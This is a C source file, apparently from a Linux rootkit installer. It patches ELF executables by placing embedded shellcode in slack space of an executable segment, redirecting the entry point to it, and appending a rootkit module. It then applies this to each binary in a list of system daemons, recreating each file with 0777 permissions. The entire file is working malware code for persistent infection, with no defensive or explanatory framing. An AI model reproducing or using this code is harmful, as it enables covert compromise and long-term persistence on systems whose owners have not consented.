#include "injector.h"

extern const char _binary_shellcode_bin_start[];
extern const char _binary_shellcode_bin_end[];

/**
 * find_valid_section - Find the section to be patched
 *
 * This finds the last injectable section in the executable segments.
 * This method is derived from the repository `drow`[1].
 *
 * [1]: https://github.com/zznop/drow
 */
int find_valid_section(char *image,
                       unsigned long patch_size,
                       unsigned long *ppatch_base,
                       unsigned long *ppatch_virtual_base)
{
    Elf64_Ehdr *elf_header = (Elf64_Ehdr *) image;
    Elf64_Shdr *section_headers = (Elf64_Shdr *) (image + elf_header->e_shoff);
    Elf64_Phdr *program_headers = (Elf64_Phdr *) (image + elf_header->e_phoff);
    char *str_table = image + section_headers[elf_header->e_shstrndx].sh_offset;
    int mx = 0;
    for (int i = 0; i < elf_header->e_phnum; i++) {
        if (!(program_headers[i].p_flags & PF_X))
            continue;
        for (int j = 0; j < elf_header->e_shnum; j++)
            if (section_headers[j].sh_offset + section_headers[j].sh_size <=
                    program_headers[i].p_offset + program_headers[i].p_filesz &&
                j + 1 != elf_header->e_shnum &&
                !(section_headers[j + 1].sh_offset -
                          section_headers[j].sh_offset -
                          section_headers[j].sh_size <
                      patch_size &&
                  section_headers[j + 1].sh_addr - section_headers[j].sh_addr -
                          section_headers[j].sh_size <
                      patch_size))
                mx = j;
        if (!mx)
            continue;
        printf(INFO "Section found: 0x%lx %s\n", section_headers[mx].sh_offset,
               str_table + section_headers[mx].sh_name);
        *ppatch_base =
            section_headers[mx].sh_offset + section_headers[mx].sh_size;
        *ppatch_virtual_base =
            section_headers[mx].sh_addr + section_headers[mx].sh_size;
        program_headers[i].p_filesz += patch_size;
        program_headers[i].p_memsz += patch_size;
        section_headers[mx].sh_size += patch_size;
        return 0;
    }

    return -1;
}

int get_file_size(int fd)
{
    struct stat sb;
    if (fstat(fd, &sb) < 0) {
        puts("[!] fstat fail");
        exit(1);
    }
    return sb.st_size;
}


void install_module_by_path(char *path,
                            const char module_start[],
                            const char module_end[])
{
    /*
     * Unlink the original file and use mmap to map a memory region
     * `source_image` to save the content. This is because the executing file
     * cannot be modified, but can be unlinked.
     */
    int fd = open(path, O_RDONLY);
    char *source_image, *image;
    if (fd < 0) {
        printf(WARN "fail to open file %s\n", path);
        printf(WARN "Error: %s\n", strerror(errno));
        return;
    }
    int image_size = get_file_size(fd);
    if (!(source_image = mmap(NULL, image_size, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE, fd, 0))) {
        puts(WARN "Fail to mmap");
        close(fd);
        return;
    }
    close(fd);
    unlink(path);

    /*
     * Recreate the file image and map it to `image`.
     * Move the original content to `image`.
     * Unmap the `source_image`.
     * At this time, we have a memory region can be used to modify the file
     * content.
     */
    fd = open(path, O_RDWR | O_CREAT, 0777);
    if (fd < 0) {
        printf(WARN "Fail to open file %s\n", path);
        printf(WARN "Error: %s\n", strerror(errno));
        return;
    }
    unsigned long evil_size = module_end - module_start;
    unsigned long evil_base = ALIGN_UP(image_size, 0xfff);
    ftruncate(fd, evil_base + evil_size);
    image = mmap(NULL, evil_base + evil_size, PROT_READ | PROT_WRITE,
                 MAP_SHARED, fd, 0);
    close(fd);
    memmove(image, source_image, image_size);
    munmap(source_image, image_size);
    source_image = NULL;

    unsigned long patch_base, patch_virtual_base;
    unsigned long patch_size = _binary_shellcode_bin_end -
                               _binary_shellcode_bin_start + strlen(path) + 1;
    if (find_valid_section(image, patch_size, &patch_base,
                           &patch_virtual_base)) {
        puts(WARN "No avalible space for patching");
        goto out;
    }
    char *shellcode = malloc(patch_size - strlen(path) - 1);
    if (!shellcode)
        goto out;
    memmove(shellcode, _binary_shellcode_bin_start,
            patch_size - strlen(path) - 1);
    Elf64_Ehdr *elf_header = (Elf64_Ehdr *) image;
    *(unsigned long *) (shellcode + 2) =
        patch_virtual_base - elf_header->e_entry;
    *(unsigned long *) (shellcode + 10) = evil_base;
    *(unsigned long *) (shellcode + 18) = evil_size;
    elf_header->e_entry = patch_virtual_base;

    memmove(image + patch_base, shellcode, patch_size - strlen(path) - 1);
    memmove(image + patch_base + patch_size - strlen(path) - 1, path,
            strlen(path) + 1);
    memmove(image + evil_base, module_start, evil_size);
    free(shellcode);
    shellcode = NULL;

    printf(INFO "Successfully inject rootkit into %s\n", path);
out:
    msync(image, evil_base + evil_size, MS_SYNC);
    munmap(image, evil_base + evil_size);
    image = NULL;
    return;
}

void install_module(const char module_start[], const char module_end[])
{
    for (int i = 0; i < ARRAY_SIZE(sys_daemons); i++) {
        install_module_by_path(sys_daemons[i], module_start, module_end);
    }
}
